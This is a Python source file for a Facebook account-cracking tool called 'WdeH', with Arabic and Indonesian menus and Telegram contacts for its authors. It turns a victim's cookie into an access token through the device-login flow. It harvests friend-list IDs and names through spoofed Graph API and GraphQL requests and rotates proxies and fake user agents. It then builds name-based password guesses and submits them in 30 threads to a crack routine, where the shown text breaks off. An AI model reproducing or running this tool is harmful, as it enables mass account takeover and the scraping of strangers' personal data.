import re,random,uuid,subprocess
from os import system
import base64
import urllib3
import rich
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from bs4 import BeautifulSoup as sop
import requests,bs4,json,sys,random,datetime,time
import time,json,string
from bs4 import BeautifulSoup as bs,os
q="968"
qq="8280"
qqq="52729"
qqqq="420"
client_id = f"{qqqq}038{q}89{qq}485649{qqq}208"
BR = '\x1b[38;5;208m'
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
MJ4 = '\x1b[38;5;106m'
ma = '\x1b[38;5;26m'
Z = '\033[1;36m' #احمر
R = '\033[1;35m' #احمر
X = '\033[1;34m' #اصفر
F = '\033[2;33m' #اخضر
C = "\033[1;32m" #ابيض
Y = '\033[1;30m' #ازرق فاتح.
E = '\033[1;36m'
B = '\033[2;35m'
G = '\033[1;33m'
S = '\033[1;32m'
GG = '\033[2;32m' #اخضر
W = "\033[1;97m" #ابيض
Z1 = '\033[1;31m' #احمر
P = '\033[2;35m' #وردي
colors = [BR, AH2, AS2, MJ, MJ2, MJ3, MJ4, ma,Z,R,X,F,C,B,Y,E,G,S,GG,W,Z1,P]
random_color = random.choice(colors)
def es():
    anim = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;95m■■■■\x1b[0m□□□□□□]", "[\x1b[1;94m■■■■■\x1b[0m□□□□□]", "[\x1b[38;5;26m■■■■■■\x1b[0m□□□□]", "[\x1b[1;96m■■■■■■■\x1b[0m□□□]", "[\x1b[38;5;86m■■■■■■■■\x1b[0m□□]", "[\x1b[38;5;96m■■■■■■■■■\x1b[0m□]", "[\x1b[38;5;203m■■■■■■■■■■\x1b[0m]"]
    am = ('😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '😚', '😙','😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', '😏', '😒', '🙄', '😬','🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', '🤯', '🤠','🥳', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭','😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾','🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❣️', '💕','💞', '💓', '💗', '💖', '💘', '💝', '💟', '❤️‍🔥', '❤️‍🩹', '❤️','🚀', '🛸', '🌍', '🌎', '🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆‍♂️','🤦‍♂️','✨','🗿','👍🏼','🚬')
    for i in range(1):
        time.sleep(.0)
        os.system('clear')
        sys.stdout.write(f"\r {random_color}WdeH... " + anim[i % len(anim)] +"\x1b[0m ")
        sys.stdout.write(f"\r {random_color}WdeH... " + am[i % len(am)] +"\x1b[0m ")
        sys.stdout.flush()
es()
try:
	import requests
except ImportError:
	Z = '\033[1;36m' #احمر
R = '\033[1;35m' #احمر
X = '\033[1;34m' #اصفر
F = '\033[2;33m' #اخضر
C = "\033[1;32m" #ابيض
Y = '\033[1;30m' #ازرق فاتح.
E = '\033[1;36m'
B = '\033[2;35m'
G = '\033[1;33m'
S = '\033[1;32m'
GG = '\033[2;32m' #اخضر
W = "\033[1;97m" #ابيض
Z1 = '\033[1;31m' #احمر
P = '\033[2;35m' #وردي
try:
 from cfonts import render,say
except:
    os.system('pip install python-cfonts')
output = render('WDEH',colors=['red','white'], align='center')
print(output)
print(GG+'-'*1+W+'{ '*1+GG+'@WDEH_ALROSE'*1+W+' }'*1+GG+'-'*1+W+'{'*1+Z1+' 𝐖𝐃𝐄𝐇׀𝐁𝐘𓅓'*1+W+' }'*1+F'-'*1+GG+W+'{'*1+GG+'@YRWSYY'*1+W+'}'*1)
print('')
token=input(GG+'T'*1+W+'O'*1+P+'K'*1+B+'E'*1+X+'N '*1+GG+'➯'*1+B)
print('')
ID=input(' ID' +B+ '➯'+X)
os.system('clear')
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mلا يوجد انترت')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 4A Build/MMB29M; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(80,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='R70A Build/NRD90M'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
GJ = '\033[2;36m'
Y = '\033[1;34m' 
E = '\033[1;31m'
AB_A="\033[1;97m" # ابيض خط عربض
RS='\033[30m' #رصاصي
AH_F='\033[31m'   #احمر فاتح
AKH_F='\033[32m' #اخضر فاتح
AS_T='\033[33m'#اصفر طوخ
SM='\033[34m'  #سمائي
BN='\033[35m'#بنفسجي
AZ_T='\033[36m'  #ازرك طوخ
AB_KH='\033[37m' #ابيض خط خفيف
AH_T='\033[91m'  #احمر طوخ
AKH_T='\033[92m'#اخضر طوخ
AS_F='\033[93m'    #اصفر فاتح
WR='\033[95m'      #وردي
p = '\x1b[38;5;208m' #برتقالي
AH2 = '\x1b[38;5;204m' 
AS2 = '\x1b[38;5;220m'
MJ = '\x1b[38;5;193m'
MJ2 = '\x1b[38;5;216m'
MJ3 = '\x1b[38;5;190m'
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
MJ4 = '\x1b[38;5;106m'
asu = random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def banner():
	from cfonts import render
	from random import choice
	output = render('WDEH' ,colors=[str(choice(['white'])),str(choice(['yellow'])), str(choice(['white','yellow','yellow']))],align='left',space='0')
	print(output)
	print(f'''{asu}   
	⠀⠀⠀                                      
                                      
  ██████   ████████    ██████   █████ 
 ░░░░░███ ░░███░░███  ███░░███ ███░░  
  ███████  ░███ ░███ ░███████ ░░█████ 
 ███░░███  ░███ ░███ ░███░░░   ░░░░███
░░████████ ████ █████░░██████  ██████ 
 ░░░░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░░  
                                      
                                      
                                                             
{B}┏{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┓
{Z}┃ {C}⌯ {X}TG-Tele : @YRWSYY {Z} ┃
{B}┃{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┃
{Z}┃ {C}⌯ {X}Me-Tele : @WDEH_ALROSE {Z} ┃ 
{B}┃{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┃
{Z}┃ {C}⌯ {X}Me-instagram : wdeh_alrose {Z}┃
{B}┗{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┛                                                       
''')
os.system('clear')

sim_hini = str(random.randint(2e4,4e4))
trace_id = str(uuid.uuid4())
ses=requests.Session()

try:
	android = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '').upper()
	model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '').upper()
	carrier = '' + subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[1].replace('\n', '').upper()
except:
	android = random.choice(['TECNO', "INFINIX", "SAMSUNG"])
	model = random.choice(['LD2', "SM-J009", "SM-J505", "HOT12", "NOTE-11", "A5-PRO"])
	carrier = '' + random.choice(['02', 'Oramge', 'EE', "At&amp", "MTN", "Cricket"])
def back():
	loginwd()	
def loginwd():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			basganteng = json.loads(basariheker.text)['id']
			main_menu(basganteng)
		except KeyError:
			login_epa()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_epa()
class login():
	def __init__(self):
		ids=[]
	def login_epa(self):
		system('clear');
		banner()
		print(f''''\033[1;34m                                          
              \033[1;34m⌌\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;34m⌍          
              ▏\033[33mPROGRAM \033[2;35m   : \033[2;32mWdeH \033[1;34m▕             
              ▏\033[33mChannel    \033[2;35m: \033[2;32m@YRWSYY \033[1;34m▕              
              ▏\033[33mTele       \033[2;35m: \033[2;32m@WDEH_ALROSE\033[1;34m▕
              ▏\033[33mTools      \033[2;35m: \033[2;32mWdeH AlROSE\033[1;34m ▕            
              ⌎\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;34m⌏''') 
		print(50 * '-')
		cok = input('[+] masukan cookie : ')
		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat  = {}
		raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']; pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); masuk = input('\n[✔️] كوكيز شغال اخرج وارجع شغله'); os.system('clear');main_menu()
def perfector(save_as):
	try:
		for type_id in siid:
			os.system('cat '+save_as+' | grep "'+type_id+'" >> /sdcard/007.txt')
		os.system('sort -r /sdcard/007.txt | uniq > '+save_as+'')
		os.system('rm -rf /sdcard/007.txt')
	except:pass

def main_menu():
	os.system("clear");banner()
	ip = requests.get("https://api.ipify.org").text
	print(55* '━')
	print((k+"["+p+"•"+k+"]"+p+" Your IP : "+ip))
	print(55* '━')
	print((k+"["+p+"1"+k+"]"+p+" Login cookies | تـسـجـيـل الـكـوكـيـز"))
	print((k+"["+p+"2"+k+"]"+p+" Fishing through the hands of friends | صـيـد مـن اصـدقـاء بـأكـثـر مـن ايـدي"))
	print((k+"["+p+"3"+k+"]"+p+"Catch from file | صـيـد مـن مـلـف"))
	print((k+"["+p+"4"+k+"]"+p+"Dragging an ID file from a specific IDS | سـحـب مـلـف ايـديـات مـن ايـديـات مـعـيـنـه"))
	print((k+"["+p+"5"+k+"]"+p+"Ids file arrangement | تـرتـيـب مـلـف ايـديـات"))
	print((k+"["+p+"6"+k+"]"+p+"Delete duplicate hands | حـذف الايـديـات الـمـكـرره"))
	print((k+"["+p+"7"+k+"]"+p+"Delete the number of hands you speci | حـذف عـدد ايـديـات انـت تـحـدده"))
	print((k+"["+p+"0"+k+"]"+p+" Login out | تـسـجـيـل خـروج"))
	print(55* '━')
	menu = input('\033[1;32m Choose Option  ')
	if menu in ['01','1']:
		login().login_epa();main_menu()
	elif menu in ['02','2']:
		dump_massal()
	elif menu in ['03','3']:
		crack_file()
	elif menu in ['04','4']:
		file_create_menu().new_ids()
	elif menu in ['05','5']:
		sort()
	elif menu in ['06','6']:
		d()
	elif menu in ['07','7']:
		RE2()
	elif menu in ['00','0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		exit('Thanks For Using... !')
	else:
		exit(' invalid ')
def d():
	os.system('clear')
	try:
		ch_x1 = ("y")
		if ch_x1 in ["yes","Yes","YES","Y","y"]:
			nm= input('\033[1;33m - NAME FILE : ')
			filepath=(f'{nm}')
			newfile = input("[-] Name New File Now Duplicate : ")
			os.system('sort -r '+filepath+' | uniq > '+newfile)
			if 'ouoo'=='oo':
				os.system('rm -rf akakajh')
			else:
				print(47*'-')
				print (f"\x1b[0;37m Your File Save As :\x1b[1;92m {newfile} \x1b[0;37m")
				print(47*'-')
				print('\n')
				input("\n[-] Press Inter to go Back ")
				main_menu()
		else:
				print(47*'-')
				print (f"\x1b[0;37m Total ID :\x1b[1;92m {totaldmp}")
				print (f"\x1b[0;37m Your File Save As :\x1b[1;92m {filepath} ")
				print(47*'-')
				input("\n[>>] Press Inter to go Back < ")
				main_menu()
	except Exception as e:

		print("[>] Error : %s"%e)
		exit("")
def RE2():
	ba=input('File Name :')
	numr=input('Number of lines :')
	with open(ba, "r") as f:
		lines = f.readlines()
		lines = lines[int(numr):]
		with open(ba, "w") as f:
			f.writelines(lines)
			main_menu()
siid=[]
sep=[]
class file_create_menu():
	def __init__(self):
		try:
			os.system('rm -rf .a.txt')
			os.system('rm -rf .temp.txt')
			os.remove('.temp.txt')
			os.remove('.a.txt')
		except:
			pass
		self.ids = []
		self.total = []
		self.loop = 0
		try:
			self.token = open('.token.txt', 'r').read()
			uid="100061689760374"
			try:
				headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
						   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
						   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
						   "Authorization": "OAuth "+self.token+"",
						   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
						   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
						   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
						   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
						   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
						   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
						   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
						   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
				data = {
					'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
					'client_doc_id': client_id,
					'method': 'post',
					'locale': 'en_US',
					'pretty': 'false',
					'format': 'json',
					'variables': '{"profile_id":'+uid+',"suggestion_friends_paginating_first":2500}',
					'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
					'fb_api_caller_class': 'graphservice',
					'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
					'client_trace_id': trace_id,
					'server_timestamps': 'true',
					'purpose': 'fetch'
				}
				posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
				if not posted['data']['user']['friends']['edges']:
				    os.system('clear');banner()
				    os.system('rm -rf .token.txt')
				    exit(' \n \033[1;31mYou have used this id many times try with another id & dont login this id for few days.\n\n \033[0m')
				try:
					data = posted['data']['user']['friends']['edges']
				except:
					print(f' \033[1;31m Sorry something wen wrong with this id. Login With Another ID\033[0m ')
					os.system('rm -rf .token.txt')
					exit()
			except Exception as e:
				os.system('clear');banner()
				print("\033[1;31m YOUR COOKIE HAS BEEN EXPIRED LOGIN WITH ANOTHER COOKIE\033[0m !")
				print(e)
				time.sleep(3)
				login().login_epa()
		except Exception as e:
			print(e)
			login().login_epa()
	def new_ids(self):
		os.system('clear');banner()
		save_as = input("Save file as : ")
		if not save_as == '/sdcard/':
			os.system(f'rm -rf {save_as}')
			open(save_as,'w')
		os.system('clear');
		banner()
		sepr = input(' DO YOU WANNA SEPERATE IDZ...? (y/n) : ')
		if sepr in ['y', 'Y']:
			sep.append('y')
			print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')
			try:
				sl = int(input('\n How Many Links To crack : '))
			except:
				sl = 1
			for el in range(sl):
				sid = input(f' Put {el + 1} link: ')
				siid.append(sid)
		elif sepr in ['n', 'N']:
			sep.append('n')
		else:
			sep.append('n')
		try:
			file = open('.temp.txt', 'r').read().splitlines()
		except:
			file = []
		print("        Paste All Ids Here ")
		while True:
			ids_all = input("")
			if ids_all == "":
				exit('SUCCESSFULLY DONE')
				break
			try:
				uid = ids_all.split("|")[0]
			except:
				uid = ids_all
			try:
				headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
						   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
						   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
						   "Authorization": "OAuth " + self.token + "",
						   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
						   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
						   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
						   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
						   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
						   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
						   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
						   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
				data = {
					'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
					'client_doc_id': client_id,
					'method': 'post',
					'locale': 'en_US',
					'pretty': 'false',
					'format': 'json',
					'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
					'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
					'fb_api_caller_class': 'graphservice',
					'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
					'client_trace_id': trace_id,
					'server_timestamps': 'true',
					'purpose': 'fetch'
				}
				posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
				try:
					data = posted['data']['user']['friends']['edges']
				except:
					print(f' \033[1;35msomething wrong with {uid}\033[0m ')
				if len(data) < 100:
					print(f' \033[1;31mSORRY THE ID IS NOT PUBLIC...! {uid}\033[0m ')
				else:
					for edge in data:
						node = edge['node']
						open(save_as, 'a', encoding='utf-8').write(node['id'] + "|" + node['name'] + '\n')
					if 'y' in sep:
						perfector(save_as)
					try:
						total_idss=len(open(save_as,'r').readlines())
					except:
						total_idss='-'
					x = random.choice(asu)
					print(f' {x}SUCCESSFULLY EXTRACTED... {uid} [{total_idss}] \033[0m')
					
			except KeyError:
				pass
			except requests.exceptions.ConnectionError:
				input(" connection error - press enter to continue")
		print(50 * '-')
		print(' ids save in {} path'.format(save_as))
		print(' Total ids save in file {} '.format(len(open(save_as, 'r').read().splitlines())))
		exit(50 * '-')
def sort():
	os.system('clear');banner()
	file_name = input("\033[1;32m \033[1;32m your file path : ")
	with open(file_name, "r", encoding="utf8") as file:
		ids = [line.strip() for line in file]
	sort_hogaya = sorted(ids, reverse=True)
	os.system(f'rm -rf {file_name}')
	for sorter in sort_hogaya:
		open(file_name,'a', encoding="utf8").write(sorter+'\n')
	print(50*'-')
	print(" \033[1;32m SORTED SUCCESSFULLY...!\033[0m")
	print(f" \033[1;32m YOUR IDZ SAVED IN... {file_name} \033[0m")
	print(50*'-')
	input(" Press enter to go back ")
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(' Chand ID Dawet...? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' ID '+str(yz)+' : ')
		uid.append(kl)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
		print('')
		print(f' TATAL IDZ 🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
def crack_file():
    print('\033[0;92m==================')
    o = input('\033[97;1m[\033[92;1m+\033[97;1m] FILE NAME :\033[92;1m ')
    try:lin = open(o).read().splitlines()
    except:
        print('\033[0;92m==================')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
def setting():
		os.system('clear')
		banner()
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
			method.append('mobile')
		password()
def password():
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+"123456789")
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+"123456789")
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567890')
					pwv.append(frs+'321')
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
	exit()
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([m,k,h,b,u,x])
	rc=random.choice
